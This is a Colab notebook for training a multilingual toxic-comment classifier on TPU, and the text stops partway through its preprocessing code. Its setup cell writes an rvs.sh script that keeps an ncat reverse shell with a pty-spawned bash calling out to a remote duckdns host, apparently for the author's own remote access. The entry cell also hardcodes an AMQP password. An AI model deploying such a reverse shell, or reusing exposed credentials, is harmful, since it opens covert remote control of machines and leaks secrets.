{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "accelerator": "TPU",
    "colab": {
      "name": "Copy of shonenkov-training-pipeline.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "toc_visible": true,
      "machine_shape": "hm"
    },
    "jupytext": {
      "cell_metadata_filter": "outputId,id,colab_type,colab,-all",
      "encoding": "# -*- coding: utf-8 -*-",
      "main_language": "python",
      "notebook_metadata_filter": "-all"
    },
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.6.9"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "colab_type": "text",
        "id": "wzoWM76m0Rfg"
      },
      "source": [
        "### Dont forget turn on TPU & HIGH-RAM modes :)\n",
        "\n",
        "Author: [Alex Shonenkov](https://www.kaggle.com/shonenkov) //  shonenkov@phystech.edu\n",
        "Have a good day!"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ppiQVOL5vW96",
        "colab_type": "code",
        "outputId": "3cc1df75-ff0f-4e61-97fa-0525459d3b78",
        "colab": {}
      },
      "source": [
        "!python3 -m pip install 'prompt-toolkit<2.0.0,>=1.0.15' --force-reinstall"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting prompt-toolkit<2.0.0,>=1.0.15\n",
            "  Using cached prompt_toolkit-1.0.18-py3-none-any.whl (245 kB)\n",
            "Collecting wcwidth\n",
            "  Using cached wcwidth-0.2.4-py2.py3-none-any.whl (30 kB)\n",
            "Collecting six>=1.9.0\n",
            "  Using cached six-1.15.0-py2.py3-none-any.whl (10 kB)\n",
            "\u001b[31mERROR: pyvim 3.0.2 has requirement prompt-toolkit<3.1.0,>=2.0.0, but you'll have prompt-toolkit 1.0.18 which is incompatible.\u001b[0m\n",
            "\u001b[31mERROR: google-colab 1.0.0 has requirement six~=1.12.0, but you'll have six 1.15.0 which is incompatible.\u001b[0m\n",
            "\u001b[31mERROR: datascience 0.10.6 has requirement folium==0.2.1, but you'll have folium 0.8.3 which is incompatible.\u001b[0m\n",
            "\u001b[31mERROR: albumentations 0.1.12 has requirement imgaug<0.2.7,>=0.2.5, but you'll have imgaug 0.2.9 which is incompatible.\u001b[0m\n",
            "Installing collected packages: wcwidth, six, prompt-toolkit\n",
            "  Attempting uninstall: wcwidth\n",
            "    Found existing installation: wcwidth 0.2.4\n",
            "    Uninstalling wcwidth-0.2.4:\n",
            "      Successfully uninstalled wcwidth-0.2.4\n",
            "  Attempting uninstall: six\n",
            "    Found existing installation: six 1.15.0\n",
            "    Uninstalling six-1.15.0:\n",
            "      Successfully uninstalled six-1.15.0\n",
            "  Attempting uninstall: prompt-toolkit\n",
            "    Found existing installation: prompt-toolkit 1.0.18\n",
            "    Uninstalling prompt-toolkit-1.0.18:\n",
            "      Successfully uninstalled prompt-toolkit-1.0.18\n",
            "Successfully installed prompt-toolkit-1.0.18 six-1.15.0 wcwidth-0.2.4\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "_43yMxyEvW-q",
        "colab_type": "code",
        "outputId": "5975062a-6192-4c9e-b83e-6353ab9df3ec",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 86
        }
      },
      "source": [
        "!echo $HOSTNAME\n",
        "!echo $TPU_NAME\n",
        "!nvidia-smi"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "59834edda11a\n",
            "grpc://10.16.233.106:8470\n",
            "NVIDIA-SMI has failed because it couldn't communicate with the NVIDIA driver. Make sure that the latest NVIDIA driver is installed and running.\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "n6uGvKL3upio",
        "outputId": "6b29ea48-a25e-41d4-ba7f-ab0aa8fd7eb0",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 54
        }
      },
      "source": [
        "%load_ext autoreload\n",
        "%autoreload 2"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "The autoreload extension is already loaded. To reload it, use:\n",
            "  %reload_ext autoreload\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "[autoreload of six failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "AttributeError: 'NoneType' object has no attribute 'filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.layout.containers failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "AssertionError: Expecting filter, got EmacsInsertMode()\n",
            "]\n",
            "[autoreload of prompt_toolkit.key_binding.bindings.vi failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "AttributeError: module 'prompt_toolkit' has no attribute 'filters'\n",
            "]\n"
          ],
          "name": "stderr"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "n6uGvKL3epio",
        "colab": {}
      },
      "source": [
        "import subprocess\n",
        "\n",
        "subprocess.run('[ -f setup.py ] || (git clone https://github.com/pennz/kaggle_runner; '\n",
        "'git submodule update --init --recursive; '\n",
        "'rsync -r kaggle_runner/.* .; '\n",
        "'rsync -r kaggle_runner/* .;); '\n",
        "'python3 -m pip install -e .', shell=True, check=True)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "wV017Cj1CRlg",
        "colab": {}
      },
      "source": [
        "with open(\"runner.sh\", \"w\") as f:\n",
        "    f.write(\n",
        "r\"\"\"#!/bin/bash -x\n",
        "export PS4='Line ${LINENO}: ' # for debug\n",
        "NC=ncat\n",
        "\n",
        "USER=$1\n",
        "shift\n",
        "REPO=$1\n",
        "shift\n",
        "BRANCH=$1\n",
        "shift\n",
        "PHASE=$1\n",
        "shift\n",
        "ENABLE_RVS=$1\n",
        "shift\n",
        "\n",
        "SERVER=$1\n",
        "shift\n",
        "PORT=$1\n",
        "shift\n",
        "\n",
        "ORIG_PORT=23454\n",
        "\n",
        "CHECK_PORT=$((ORIG_PORT + 1))\n",
        "python3 -m pip install --upgrade pip\n",
        "conda install -y -c eumetsat expect & # https://askubuntu.com/questions/1047900/unbuffer-stopped-working-months-ago\n",
        "apt update && apt install -y netcat nmap screen time locales >/dev/null 2>&1\n",
        "apt install -y mosh iproute2 fish tig ctags htop tree pv tmux psmisc >/dev/null 2>&1 &\n",
        "\n",
        "conda init bash\n",
        "cat >> ~/.bashrc << EOF\n",
        "conda activate base # as my dotfiles will fiddle with conda\n",
        "export SERVER=$SERVER\n",
        "export CHECK_PORT=$CHECK_PORT\n",
        "EOF\n",
        "\n",
        "source rpt # rvs IDE env setup\n",
        "export SERVER=$SERVER\n",
        "export CHECK_PORT=$CHECK_PORT\n",
        "\n",
        "wait_ncat() {\n",
        "    wait_for_ncat=$1\n",
        "\n",
        "    while [ $wait_for_ncat -gt 0 ]; do\n",
        "        wait_for_ncat=$((wait_for_ncat - 1))\n",
        "        which ncat >/dev/null && return 0\n",
        "    done\n",
        "}\n",
        "wait_ncat 60\n",
        "\n",
        "which $NC >/dev/null || NC=nc\n",
        "export NC\n",
        "\n",
        "if [ \"x${ENABLE_RVS}\" = x1 ]; then\n",
        "    if [ -z $(pgrep -f 'jupyter-notebook') ]; then\n",
        "        bash ./rvs.sh $SERVER $PORT 2>&1 &\n",
        "    else\n",
        "        screen -d -m bash -c \"{ echo [REMOTE]: rvs log below.; bash -x ./rvs.sh $SERVER $PORT 2>&1; } | $NC --send-only --no-shutdown -w 120s -i $((3600 * 2))s $SERVER $CHECK_PORT\"\n",
        "    fi\n",
        "fi &\n",
        "\n",
        "python3 -m pip install ripdb pydicom parse pytest-logger python_logging_rabbitmq coverage &\n",
        "python3 -m pip install pyvim neovim msgpack==1.0.0 & # for vim\n",
        "\n",
        "# SRC_WORK_FOLDER=/kaggle/working # it is just current working folder\n",
        "# [ -d ${SRC_WORK_FOLDER} ] || mkdir -p ${SRC_WORK_FOLDER}\n",
        "#\n",
        "# cd ${SRC_WORK_FOLDER}\n",
        "\n",
        "if [ -d ${REPO} ]; then rm -rf ${REPO}; fi\n",
        "\n",
        "# get code\n",
        "{\n",
        "    mvdir() {\n",
        "        [[ \"$2\"/\"$1\" -ef \"${PWD}\" ]] || {\n",
        "            rm -rf \"$2\"/\"$1\" &&\n",
        "                mkdir \"$2\"/\"$1\"\n",
        "        }\n",
        "\n",
        "        bash -c \"mv \"\"$1\"\"/*\"\" $2\"\"/\"\"$1\"\n",
        "    }\n",
        "    export -f mvdir\n",
        "\n",
        "    if [ ! -d ${REPO} ]; then\n",
        "        git clone --single-branch --branch ${BRANCH} --depth=1 \\\n",
        "            https://github.com/${USER}/${REPO}.git ${REPO} && pushd ${REPO} &&\n",
        "        sed -i 's/git@\\(.*\\):\\(.*\\)/https:\\/\\/\\1\\/\\2/' .gitmodules &&\n",
        "        sed -i 's/git@\\(.*\\):\\(.*\\)/https:\\/\\/\\1\\/\\2/' .git/config &&\n",
        "        git submodule update --init --recursive\n",
        "        find . -maxdepth 1 -name \".??*\" -o -name \"??*\" -type f | xargs -I{} mv {} $OLDPWD\n",
        "        find . -maxdepth 1 -name \".??*\" -o -name \"??*\" -type d | xargs -I{} bash -x -c \"mvdir {}  $OLDPWD\"\n",
        "        popd\n",
        "    fi\n",
        "    make install_dep >/dev/null\n",
        "}\n",
        "\n",
        "USE_AMQP=true\n",
        "export USE_AMQP\n",
        "\n",
        "conda init bash\n",
        "source ~/.bashrc\n",
        "conda activate base\n",
        "\n",
        "if [ x\"${PHASE}\" = x\"dev\" ]; then\n",
        "    export PS4='[Remote]: Line ${LINENO}: '\n",
        "    (\n",
        "        echo \"MOSHing\"\n",
        "        make mosh\n",
        "    ) &\n",
        "\n",
        "    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi &\n",
        "    wait # not exit, when dev\n",
        "fi\n",
        "\n",
        "if [ x\"${PHASE}\" = x\"data\" ]; then\n",
        "    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase\n",
        "    make dataset\n",
        "fi\n",
        "\n",
        "if [ x\"${PHASE}\" = x\"test\" ]; then\n",
        "    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase\n",
        "    #make test\n",
        "fi\n",
        "\n",
        "if [ x\"${PHASE}\" = x\"run\" ]; then\n",
        "    bash ./rvs.sh $SERVER $PORT >/dev/null & make m & # just keep one rvs incase\n",
        "    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi\n",
        "    # basically the reverse of the calling path\n",
        "    pkill make & pkill -f \"mosh\" & pkill sleep & pkill -f \"rvs.sh\" & pkill ncat &\n",
        "    # python main.py \"$@\"\n",
        "fi\n",
        "\"\"\"\n",
        "    )\n",
        "with open(\"rvs.sh\", \"w\") as f:\n",
        "    f.write(\n",
        "r\"\"\"#!/bin/bash -x\n",
        "export PS4='Line ${LINENO}: ' # for debug\n",
        "\n",
        "NC=${NC:-ncat}\n",
        "type $NC || ( echo >&2 \"$NC cannot be found. Exit.\"; exit 1;)\n",
        "# https://stackoverflow.com/questions/57877451/retrieving-output-and-exit-code-of-a-coprocess\n",
        "# coproc { sleep 30 && echo \"Output\" && exit 3; }\n",
        "# Saving the coprocess's PID for later, as COPROC_PID apparently unsets when its finished\n",
        "# COPROC_PID_backup=$COPROC_PID\n",
        "#\n",
        "# Retrieving the coprocess's output\n",
        "# output=$(cat <&$COPROC)\n",
        "#\n",
        "# Retrieving the coprocess's exit code\n",
        "# wait $COPROC_PID_backup\n",
        "#\n",
        "# Echoing out the results\n",
        "# echo $?\n",
        "# echo $output\n",
        "\n",
        "echo BASH NOW: $BASHPID\n",
        "\n",
        "PID_FILE_PATH=/tmp/nc.pid\n",
        "EXIT_FILE_PATH=/tmp/rvs_exit.$BASHPID.pid\n",
        "\n",
        "test -f $EXIT_FILE_PATH && rm $EXIT_FILE_PATH\n",
        "\n",
        "SERVER=$1\n",
        "shift\n",
        "PORT=$1\n",
        "shift\n",
        "\n",
        "ORIG_PORT=23454\n",
        "CHECK_PORT=$((ORIG_PORT + 1))\n",
        "\n",
        "check_exit_status() {\n",
        "  [ -f /tmp/rvs_return ] && return 0\n",
        "\n",
        "  if [ -f $EXIT_FILE_PATH ] && [ x\"$(cat $EXIT_FILE_PATH)\" = x0 ]; then\n",
        "    return 0\n",
        "  fi\n",
        "\n",
        "  return 1 # not ok\n",
        "}\n",
        "\n",
        "\n",
        "connect_setup() {\n",
        "  connect_again_flag=1\n",
        "\n",
        "  sleep_time=5\n",
        "\n",
        "  while [ ${connect_again_flag} -eq 1 ]; do\n",
        "    check_exit_status && return 0\n",
        "\n",
        "    $NC -w ${1}s -i 1800s $SERVER $PORT -c \"echo $(date) started connection; echo $HOSTNAME; python -c 'import pty; pty.spawn([\\\"/bin/bash\\\", \\\"-li\\\"])'\"\n",
        "\n",
        "    RSRET=$?\n",
        "    echo $RSRET > $EXIT_FILE_PATH\n",
        "    (/bin/ss -lpants | grep \"ESTAB.*$PORT\") || >&2 echo \"\\\"$NC -w ${1}s -i 1800s $SERVER $PORT\\\" return with code $RSRET\"\n",
        "\n",
        "    if [ x\"$RSRET\" = x\"0\" ]; then\n",
        "      [ -f /tmp/rvs_exit ] && return 0\n",
        "\n",
        "      return 255 # just do not return\n",
        "    fi\n",
        "    [ $RSRET -eq 0 ] && connect_again_flag=0\n",
        "    [ $RSRET -eq 1 ] && sleep ${sleep_time} && sleep_time=$((sleep_time + sleep_time))\n",
        "  done\n",
        "  # exit, will cause rvs script exit, beside, RSRET not 0, mean connection loss\n",
        "  # thing\n",
        "  RSRET=1  # just never exit\n",
        "  echo $RSRET > $EXIT_FILE_PATH && return $RSRET\n",
        "}\n",
        "\n",
        "connect_again() {\n",
        "  # pkill -f \"nc.*$PORT\"  # no need now, our listen server can accept multiple\n",
        "  # connection now\n",
        "  connect_setup $1\n",
        "}\n",
        "\n",
        "WAIT_LIMIT=2048\n",
        "INIT_WAIT=8\n",
        "port_connect_status=0\n",
        "wait_time=$INIT_WAIT\n",
        "\n",
        "floatToInt() {\n",
        "  parsed=$(printf \"%.0f\" \"$@\")\n",
        "  [ ! $? -eq 0 ] && parsed=0\n",
        "  echo $parsed\n",
        "} 2> /dev/null\n",
        "\n",
        "while true; do\n",
        "  check_exit_status && exit 0\n",
        "  # if find that server cannot be connected, we try to restart our reverse connect again\n",
        "  nc_time=$($(which time) -f \"%e\" $NC -zw $wait_time $SERVER $CHECK_PORT 2>&1 > /dev/null)\n",
        "  nc_ret=$?\n",
        "  nc_time=$(echo $nc_time | awk '{print $NF}')\n",
        "  nc_time=$(floatToInt $nc_time)\n",
        "\n",
        "  if [ ${nc_ret} -eq 0 ]; then\n",
        "    # recover connection, need to connect_again too. For 1st time, will try to connect\n",
        "    # no connection last time, have connction now\n",
        "\n",
        "    if [ $port_connect_status -eq 0 ]; then\n",
        "      echo \"recover connection, reset wait_time and try to reconnect\"\n",
        "      wait_time=$INIT_WAIT\n",
        "      # previous connection is lost, we wait for longer to setup connection\n",
        "      check_exit_status || wait_time=15\n",
        "      connect_again $wait_time &\n",
        "    else\n",
        "      wait_time=$((wait_time + wait_time)) # double wait, network fine\n",
        "\n",
        "      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi\n",
        "    fi\n",
        "    port_connect_status=1\n",
        "  else\n",
        "    if [ $port_connect_status -eq 1 ]; then\n",
        "      echo \"found connection loss, reset wait_time and try to reconnect\"\n",
        "      wait_time=$INIT_WAIT\n",
        "      check_exit_status || wait_time=15 # previous connection is lost\n",
        "      connect_again $wait_time &\n",
        "    else # no connection all the time? we still try to connect...\n",
        "      wait_time=$((wait_time + wait_time))\n",
        "\n",
        "      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi\n",
        "      connect_again $wait_time &\n",
        "    fi\n",
        "    port_connect_status=0\n",
        "  fi\n",
        "  sleep $((wait_time - nc_time)) # check every XX seconds\n",
        "  echo $hostname $HOSTNAME\n",
        "done\n",
        "wait  # wait for any background\n",
        "\n",
        "# https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e\n",
        "# In reverse shell\n",
        "# $ python -c 'import pty; pty.spawn(\"/bin/bash\")'\n",
        "# Ctrl-Z\n",
        "#\n",
        "# In Attacker console\n",
        "# $ stty raw -echo\n",
        "# $ fg\n",
        "#\n",
        "# In reverse shell\n",
        "# $ reset\n",
        "# $ export SHELL=bash\n",
        "# $ export TERM=xterm-256color\n",
        "# $ stty rows <num> columns <cols>\n",
        "\"\"\"\n",
        "    )\n",
        "with open(\"rpt\", \"w\") as f:\n",
        "    f.write(\n",
        "r\"\"\"#!/bin/bash\n",
        "[ -d ~/.fzf ] || {\n",
        "git clone --depth=1 https://github.com/pennz/dotfiles\n",
        "rsync -r dotfiles/.* ~\n",
        "rsync -r dotfiles/* ~\n",
        "pushd ~\n",
        "git submodule update --init\n",
        ".fzf/install --all\n",
        "curl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n",
        "curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n",
        "# vim -u ~/.vimrc_back \"+call plug#begin()\" +PlugInstall +qa &\n",
        "# ( sleep 60; nvim -Vnvim_log -u ~/.vimrc_back \"+call plug#begin()\" +PlugInstall +checkhealth +qa )&\n",
        "ln -s .shrc_customised.macos .shrc_customised\n",
        "echo \"alias gdrive='gdrive  --service-account a.json'\" >> ~/.bash_aliases\n",
        "echo \"unalias vim\" >> ~/.bash_aliases\n",
        "echo \"alias vim='nvim -u ~/.vimrc_back'\" >> ~/.bash_aliases\n",
        "popd\n",
        "\n",
        "cat >> ~/.profile << EOF\n",
        "export SHELL=/bin/bash\n",
        "export TERM=screen-256color\n",
        "stty intr ^\\c susp ^\\x eof ^\\f echo opost\n",
        "# https://unix.stackexchange.com/questions/343088/what-is-the-equivalent-of-stty-echo-for-zsh\n",
        "# unsetopt ZLE # for zsh\n",
        "# for ourside stty raw isig -echo icrnl time 3 echoprt opost eof ^\\p\n",
        "\n",
        "color_my_prompt () {\n",
        "    local __user_and_host=\"\\[\\033[01;32m\\]\\u@\\h\"\n",
        "    local __cur_location=\"\\[\\033[01;34m\\]\\w\"\n",
        "    local __git_branch_color=\"\\[\\033[31m\\]\"\n",
        "    # local __git_branch=\"\\`ruby -e \\\"print (%x{git branch 2> /dev/null}.grep(/^\\*/).first || '').gsub(/^\\* (.+)$/, '(\\1) ')\\\"\\`\"\n",
        "    local __git_branch='`git branch 2> /dev/null | grep -e ^* | ${SED:-sed} -E  s/^\\\\\\\\\\*\\ \\(.+\\)$/\\(\\\\\\\\\\1\\)\\ /`'\n",
        "    local __prompt_tail=\"\\[\\033[35m\\]$\"\n",
        "    local __last_color=\"\\[\\033[00m\\]\"\n",
        "    export PS1=\"$__user_and_host $__cur_location $__git_branch_color$__git_branch$__prompt_tail$__last_color \"\n",
        "}\n",
        "\n",
        "ENV=/root/.bashrc\n",
        "PYTHONWARNINGS=ignore:::pip._internal.cli.base_command\n",
        "MPLBACKEND=module://ipykernel.pylab.backend_inline\n",
        "\n",
        "PS4=\"$HOSTNAME: \"'${LINENO}: '\n",
        "_=/usr/bin/env\n",
        "PWD=/kaggle/working\n",
        "cd $PWD\n",
        "OLDPWD=/root\n",
        "\n",
        "# color_my_prompt\n",
        "locale-gen\n",
        "echo \"#\" $(grep 'cpu ' /proc/stat >/dev/null;sleep 0.1;grep 'cpu ' /proc/stat | awk -v RS=\"\" '{print \"CPU: \"($13-$2+$15-$4)*100/($13-$2+$15-$4+$16-$5)\"%\"}') \"Mem: \"$(awk '/MemTotal/{t=$2}/MemAvailable/{a=$2}END{print 100-100*a/t\"%\"}' /proc/meminfo) \"Uptime: \"$(uptime | awk '{print $1 \" \" $2 \" \" $3}')\n",
        "echo \"#\" TPU_NAME=$TPU_NAME\n",
        "nvidia-smi\n",
        "conda activate base\n",
        "EOF\n",
        "}\n",
        "\"\"\"\n",
        "    )\n",
        "with open(\"gdrive_setup\", \"w\") as f:\n",
        "    f.write(\n",
        "r\"\"\"#!/bin/bash\n",
        "wget https://github.com/gdrive-org/gdrive/releases/download/2.1.0/gdrive-linux-x64\n",
        "chmod +x gdrive-linux-x64\n",
        "cp gdrive-linux-x64 /bin/gdrive\n",
        "\n",
        "mkdir ~/.gdrive\n",
        "\n",
        "# auth file\n",
        "cat > ~/.gdrive/a.json << EOF\n",
        "NO_PASS\n",
        "\n",
        "EOF\n",
        "\n",
        "gdrive --service-account a.json list  # just test\n",
        "\n",
        "SRC_WORK_FOLDER=/kaggle/input\n",
        "[ -d ${SRC_WORK_FOLDER} ] || {\n",
        "    mkdir -p ${SRC_WORK_FOLDER}\n",
        "    cd ${SRC_WORK_FOLDER}\n",
        "    gdrive --service-account a.json download -r 1CHDWIN0M6PD4SQyplbWefBCzNzdPVd-m\n",
        "    tar xf siim-train-test.tar.gz -C /kaggle/input\n",
        "}\n",
        "# cat > tgz_files.sh << EOF\n",
        "# #!/bin/bash\n",
        "# tgzfile () {\n",
        "#   tar cf - $1 -P | pv -s $(du -sb $1 | awk '{print $1}') | gzip > /home/$1.tar.gz\n",
        "# }\n",
        "# cd /kaggle/input\n",
        "# find . -maxdepth 1 -type d -name \"??*\" | while read -r line; do\n",
        "#     echo $line\n",
        "#     tgzfile $line\n",
        "# done\n",
        "# EOF\n",
        "\"\"\"\n",
        "    )"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "fk22W4JeCRlm",
        "colab": {}
      },
      "source": [
        "import os\n",
        "server = \"vtool.duckdns.org\"\n",
        "os.environ['SERVER'] = server\n",
        "\n",
        "entry_str = r\"\"\"#!/bin/bash\n",
        "PS4='Line ${LINENO}: ' bash -x runner.sh pennz kaggle_runner master \"test\" 1 \"\"\"+ server +\"\"\" \"9017\" \"amqp://kaggle:9b83ca70cf4cda89524d2283a4d675f6@pengyuzhou.com/\" \"384\" \"19999\" \"intercept\" | tee runner_log\n",
        "\"\"\"\n",
        "if False:\n",
        "    entry_str += r\"\"\"PS4='Line ${LINENO}: ' bash -x gdrive_setup >>loggdrive &\"\"\"\n",
        "\n",
        "with open(\"entry.sh\", \"w\") as f:\n",
        "    f.write(entry_str)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "UAC8442XCRlq",
        "colab": {}
      },
      "source": [
        "import os\n",
        "import sys\n",
        "sys.path.append(os.getcwd())\n",
        "\n",
        "import selectors\n",
        "import subprocess\n",
        "from importlib import reload, import_module\n",
        "import_module('kaggle_runner')\n",
        "from kaggle_runner import logger\n",
        "logger.debug(\"Logger loaded. Will run entry.sh.\")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "mC6qgI68EMQm",
        "outputId": "31827dc1-9bc8-40fe-c230-1aefbc223d5c",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "source": [
        "%%bash --bg --out runner_log --err runner_err_log\n",
        "bash -x entry.sh"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Starting job # 2 in a separate thread.\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "IklWPKSwNsXN",
        "colab_type": "text"
      },
      "source": [
        "# NOW kernel code"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "HsZb7QICuRIe",
        "colab": {}
      },
      "source": [
        "!python3 -m pip install 'prompt-toolkit<2.0.0,>=1.0.15' --force-reinstall\n",
        "!python -m pip install 'prompt-toolkit<2.0.0,>=1.0.15' --force-reinstall\n",
        "!curl https://raw.githubusercontent.com/pytorch/xla/master/contrib/scripts/env-setup.py -o pytorch-xla-env-setup.py > /dev/null\n",
        "!python pytorch-xla-env-setup.py --version 20200420 --apt-packages libomp5 libopenblas-dev\n",
        "!python3 -m pip install transformers==2.5.1 > /dev/null\n",
        "!python3 -m pip install pandarallel > /dev/null\n",
        "!python3 -m pip install catalyst==20.4.2 > /dev/null"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "KFZrVc5nCRlw",
        "colab": {}
      },
      "source": [
        "import numpy as np\n",
        "import pandas as pd\n",
        "\n",
        "import os\n",
        "os.environ['XLA_USE_BF16'] = \"1\"\n",
        "\n",
        "from glob import glob\n",
        "\n",
        "import torch\n",
        "import torch.nn as nn\n",
        "from torch.utils.data import Dataset,DataLoader\n",
        "from torch.autograd import Variable\n",
        "from torch.utils.data.sampler import SequentialSampler, RandomSampler\n",
        "import sklearn\n",
        "\n",
        "import time\n",
        "import random\n",
        "from datetime import datetime\n",
        "from tqdm import tqdm\n",
        "tqdm.pandas()\n",
        "\n",
        "from transformers import BertModel, BertTokenizer\n",
        "from transformers import XLMRobertaModel, XLMRobertaTokenizer\n",
        "from transformers import AdamW, get_linear_schedule_with_warmup, get_constant_schedule\n",
        "from catalyst.data.sampler import DistributedSamplerWrapper, BalanceClassSampler\n",
        "\n",
        "import gc\n",
        "import re\n",
        "\n",
        "# !python3 -m pip install nltk > /dev/null\n",
        "import nltk\n",
        "nltk.download('punkt')\n",
        "\n",
        "from nltk import sent_tokenize\n",
        "\n",
        "from pandarallel import pandarallel\n",
        "\n",
        "pandarallel.initialize(nb_workers=4, progress_bar=False)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "M-VP4QbZu9EB",
        "colab": {}
      },
      "source": [
        "SEED = 42\n",
        "\n",
        "MAX_LENGTH = 224\n",
        "BACKBONE_PATH = 'xlm-roberta-large'\n",
        "# ROOT_PATH = f'..'\n",
        "ROOT_PATH = f'/kaggle' # for colab\n",
        "\n",
        "\n",
        "def seed_everything(seed):\n",
        "    random.seed(seed)\n",
        "    os.environ['PYTHONHASHSEED'] = str(seed)\n",
        "    np.random.seed(seed)\n",
        "    torch.manual_seed(seed)\n",
        "    torch.cuda.manual_seed(seed)\n",
        "    torch.backends.cudnn.deterministic = True\n",
        "    torch.backends.cudnn.benchmark = True\n",
        "\n",
        "seed_everything(SEED)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "63ceMzcxu9GS",
        "colab": {}
      },
      "source": [
        "from nltk import sent_tokenize\n",
        "from random import shuffle\n",
        "import random\n",
        "import albumentations\n",
        "from albumentations.core.transforms_interface import DualTransform, BasicTransform\n",
        "\n",
        "\n",
        "LANGS = {\n",
        "    'en': 'english',\n",
        "    'it': 'italian',\n",
        "    'fr': 'french',\n",
        "    'es': 'spanish',\n",
        "    'tr': 'turkish',\n",
        "    'ru': 'russian',\n",
        "    'pt': 'portuguese'\n",
        "}\n",
        "\n",
        "def get_sentences(text, lang='en'):\n",
        "    return sent_tokenize(text, LANGS.get(lang, 'english'))\n",
        "\n",
        "def exclude_duplicate_sentences(text, lang='en'):\n",
        "    sentences = []\n",
        "\n",
        "    for sentence in get_sentences(text, lang):\n",
        "        sentence = sentence.strip()\n",
        "\n",
        "        if sentence not in sentences:\n",
        "            sentences.append(sentence)\n",
        "\n",
        "    return ' '.join(sentences)\n",
        "\n",
        "def clean_text(text, lang='en'):\n",
        "    text = str(text)\n",
        "    text = re.sub(r'[0-9\"]', '', text)\n",
        "    text = re.sub(r'#[\\S]+\\b', '', text)\n",
        "    text = re.sub(r'@[\\S]+\\b', '', text)\n",
        "    text = re.sub(r'https?\\S+', '', text)\n",
        "    text = re.sub(r'\\s+', ' ', text)\n",
        "    text = exclude_duplicate_sentences(text, lang)\n",
        "\n",
        "    return text.strip()\n",
        "\n",
        "\n",
        "class NLPTransform(BasicTransform):\n",
        "    \"\"\" Transform for nlp task.\"\"\"\n",
        "\n",
        "    @property\n",
        "    def targets(self):\n",
        "        return {\"data\": self.apply}\n",
        "\n",
        "    def update_params(self, params, **kwargs):\n",
        "        if hasattr(self, \"interpolation\"):\n",
        "            params[\"interpolation\"] = self.interpolation\n",
        "\n",
        "        if hasattr(self, \"fill_value\"):\n",
        "            params[\"fill_value\"] = self.fill_value\n",
        "\n",
        "        return params\n",
        "\n",
        "    def get_sentences(self, text, lang='en'):\n",
        "        return sent_tokenize(text, LANGS.get(lang, 'english'))\n",
        "\n",
        "class ShuffleSentencesTransform(NLPTransform):\n",
        "    \"\"\" Do shuffle by sentence \"\"\"\n",
        "    def __init__(self, always_apply=False, p=0.5):\n",
        "        super(ShuffleSentencesTransform, self).__init__(always_apply, p)\n",
        "\n",
